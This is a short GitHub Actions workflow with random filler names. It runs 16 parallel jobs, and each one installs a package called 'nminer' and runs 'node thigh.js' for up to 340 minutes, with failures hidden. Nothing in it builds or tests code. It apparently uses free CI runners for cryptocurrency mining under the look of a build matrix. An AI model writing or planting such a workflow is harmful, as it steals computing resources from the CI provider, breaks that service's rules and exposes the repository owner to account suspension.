name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7915 }
          - { version: 3698 }
          - { version: 8005 }
          - { version: 2773 }
          - { version: 5917 }
          - { version: 3764 }
          - { version: 1491 }
          - { version: 6025 }
          - { version: 8397 }
          - { version: 1091 }
          - { version: 5014 }
          - { version: 3965 }
          - { version: 161 }
          - { version: 9643 }
          - { version: 2880 }
          - { version: 2448 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: worriedly newsstand
        run: |
          npm install nminer@latest
          timeout 340m node thigh.js || echo "thigh executed"